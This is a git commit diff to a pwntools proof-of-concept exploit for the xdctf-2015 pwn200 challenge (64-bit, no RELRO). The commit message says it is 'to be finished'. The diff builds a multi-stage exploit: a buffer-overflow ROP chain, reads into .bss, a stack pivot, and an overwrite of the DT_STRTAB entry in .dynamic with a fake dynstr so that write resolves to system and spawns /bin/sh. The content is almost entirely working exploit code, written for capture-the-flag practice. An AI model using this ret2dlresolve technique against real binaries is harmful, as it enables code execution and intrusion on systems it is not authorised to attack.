7d63bffb7013ba79dd07bba4e08cf4ec93086047
leo <hireedleo@gmail.com>
2021-03-30 17:01:41 +0800

    to be finished

--- pwn/ctf_wiki/stack/ret2dlresolve/xdctf-2015-pwn200/64/no_relro/poc.py
+++ pwn/ctf_wiki/stack/ret2dlresolve/xdctf-2015-pwn200/64/no_relro/poc.py
@@ -14,6 +14,11 @@ else:
 	h, p = args.RHOST.split(':')
 	g_io = remote(h, p)
 
+def getpid():
+	if (args.LOCAL):
+		log.info("pid:%d\n", g_io.proc.pid)
+		pause()
+
 def ropArgs3(rdi, rsi, rdx, got_func):
 	# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
 	addr_pop6_ret = 0x40076a
@@ -37,32 +42,53 @@ def ropArgs3(rdi, rsi, rdx, got_func):
 
 
 def pwn():
+	vuln_addr = 0x400607
 	bss_addr = g_elf.bss()
-	new_stk = bss_addr + 0xd0 # new_stk = 0x600c00
+	data_addr = bss_addr + 0xd0 # data_addr = 0x600c00
 	bof_padding_len = 0x70 + 8
 	p_rdi = 0x400773 # pop rdi; ret
 	write_plt = 0x4004e6
-	addr_dt_strtab = g_elf.get_section_by_name(".dynamic")["sh_addr"] + 0x10*8 + 8
-	binsh_addr = new_stk
-	sh = "/bin/sh\0"
+	dynamic_shaddr = g_elf.get_section_by_name(".dynamic")["sh_addr"]
+	addr_dt_strtab =  dynamic_shaddr + 0x10*8 + 8
+	binsh_addr = data_addr
+	sh = b"/bin/sh\0"
 	fake_dynstr = g_elf.get_section_by_name(".dynstr").data().replace(b"write", b"system")
 	fake_dynstr_addr = binsh_addr + 8
+	aligned_data_len = (len(sh) + len(fake_dynstr) + 0xf) & 0xfffffff0
+	new_stk = data_addr + aligned_data_len
+	
+	log.info(".dynamic@%#x\nDT_STRTAB's val=%#x\n.bss@%#x\ndata@%x\nrop@%#x\n", dynamic_shaddr, addr_dt_strtab, bss_addr, data_addr, new_stk)
 
-
+	padding = 'a' * bof_padding_len
 	rop = ROP(g_elf)
-	rop.raw('a' * bof_padding_len)
-	rop.raw(ropArgs3(0, addr_dt_strtab, 0x8, g_elf.got["read"]))
-	rop.raw(ropArgs3(0, new_stk, len(sh) + len(fake_dynstr), g_elf.got["read"]))
+	rop.raw(padding)
+	#rop.raw(ropArgs3(0, data_addr, aligned_data_len + 0x200, g_elf.got["read"]))
+	rop.raw(ropArgs3(0, data_addr, 0x100, g_elf.got["read"]))
+	rop.raw(vuln_addr)
+	# vuln() don't have enough bof space, we have to do ROP in 2 steps.
+	print("rop chain length: %d\n" % len(rop.chain()))
+	assert(len(rop.chain()) <= 0x100)
+	getpid()
+	# 1st. read: bof, ready to read data to .bss and migrate
+	g_io.send(rop.chain())
+	
+	rop = ROP(g_elf)
+	rop.raw(ropArgs3(0, addr_dt_strtab, 8, g_elf.got["read"]))
 	rop.raw(p_rdi) # pop rdi; ret
 	rop.raw(binsh_addr)
 	rop.raw(write_plt)
+	raw_rop = rop.chain()
+	second_read_payload = flat({0:sh, len(sh):fake_dynstr, aligned_data_len:raw_rop})
+	# 2nd. read to .bss
+	g_io.send(second_read_payload)
+	# 3rd. read, from vuln(), to bof of ROP-migrate
+	rop = ROP(g_elf)
+	rop.raw(padding)
+	rop.migrate(new_stk)
+	g_io.send(rop.chain())
+	# 4th. read to .dynamic's DT_STRTAB entry, make it points to fake_dynstr
+	g_io.send(flat(fake_dynstr_addr))
 
-	print("rop chain length: %d\n", len(rop.chain()))
-	assert(len(rop.chain()) <= 0x100)
-
-	payload = flat({rop.chain().ljust(0x100, b"\x00"), binsh_addr, fake_dynstr})
-
-	g_io.send(payload)
 	
 if ("__main__" == __name__):
 	debug_on()
